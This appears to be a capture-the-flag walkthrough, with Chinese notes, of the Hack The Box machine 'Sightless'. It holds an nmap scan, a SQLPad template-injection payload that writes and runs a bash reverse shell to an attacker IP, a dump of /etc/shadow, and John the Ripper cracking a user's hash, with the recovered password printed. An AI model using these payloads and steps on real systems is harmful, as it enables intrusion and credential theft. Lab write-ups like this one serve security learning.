## Sightless

```
[★]$ nmap -sC -sV 10.129.231.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-03 02:44 CDT
Nmap scan report for sightless.htb (10.129.231.103)
Host is up (0.010s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.231.103]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Sightless.htb
```

```
{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.71/4455 0>&1" > /tmp/exploit.sh') }}
```


```
$ nc -lvnp 4455
```
在浏览器Database发送：
```
{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i
>& /dev/tcp/10.10.14.21/4455 0>&1" > /tmp/exploit.sh') }}

{{ process.mainModule.require('child_process').exec('/bin/bash /tmp/exploit.sh')
}}
```
```
[★]$ nc -lvnp 4455
listening on [any] 4455 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.243.28] 56304
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# whoami | id
whoami | id
uid=0(root) gid=0(root) groups=0(root)
root@c184118df0a6:/var/lib/sqlpad# ls -la
ls -la
total 200
drwxr-xr-x 4 root root   4096 Sep  3 13:40 .
drwxr-xr-x 1 root root   4096 Mar 12  2022 ..
drwxr-xr-x 2 root root   4096 Aug  9  2024 cache
drwxr-xr-x 2 root root   4096 Aug  9  2024 sessions
-rw-r--r-- 1 root root 188416 Sep  3 13:40 sqlpad.sqlite

root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
<SNIP>
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root@c184118df0a6:/var/lib/sqlpad#

root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
<SNIP>
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```
```
root@c184118df0a6:/var/lib/sqlpad# grep '^michael:' /etc/passwd > passwd_michael
<lpad# grep '^michael:' /etc/passwd > passwd_michael
root@c184118df0a6:/var/lib/sqlpad# grep '^michael:' /etc/shadow > shadow_michael
<lpad# grep '^michael:' /etc/shadow > shadow_michael
root@c184118df0a6:/var/lib/sqlpad# ls -la
ls -la
total 208
drwxr-xr-x 4 root root   4096 Sep  3 13:53 .
drwxr-xr-x 1 root root   4096 Mar 12  2022 ..
drwxr-xr-x 2 root root   4096 Aug  9  2024 cache
-rw-r--r-- 1 root root     45 Sep  3 13:52 passwd_michael
drwxr-xr-x 2 root root   4096 Aug  9  2024 sessions
-rw-r--r-- 1 root root    134 Sep  3 13:53 shadow_michael
-rw-r--r-- 1 root root 188416 Sep  3 13:50 sqlpad.sqlite
root@c184118df0a6:/var/lib/sqlpad# cat passwd_michael
cat passwd_michael
michael:x:1001:1001::/home/michael:/bin/bash
root@c184118df0a6:/var/lib/sqlpad# cat shadow_michael
cat shadow_michael
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```
#### 将合并Passwd_michael和shadow_michael，从 passwd 文件拿到用户名和 UID 等信息；从 shadow 文件拿到用户名和密码哈希。
```
[★]$ vi passwd_michael
┌─[us-dedivip-1]─[10.10.14.71]─[syareya55@htb-tpkybyu0pr]─[~/Sightless]
└──╼ [★]$ vi shadow_michael
┌─[us-dedivip-1]─[10.10.14.71]─[syareya55@htb-tpkybyu0pr]─[~/Sightless]
└──╼ [★]$ cat passwd_michael shadow_michael
michael:x:1001:1001::/home/michael:/bin/bash
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::

[★]$ sudo apt install john -y
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ unshadow passwd_michael shadow_michael > michael_unshadowed
Created directory: /home/syareya55/.john
[★]$ ls
michael_unshadowed  passwd_michael  rockyou.txt  shadow_michael
[★]$ cat michael_unshadowed
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:1001:1001::/home/michael:/bin/bash

[★]$ john --wordlist=rockyou.txt michael_unshadowed
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
insaneclownposse (michael)     
1g 0:00:00:08 DONE (2025-09-03 09:26) 0.1146g/s 6752p/s 6752c/s 6752C/s kruimel..bluedolphin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
#### insaneclownposse
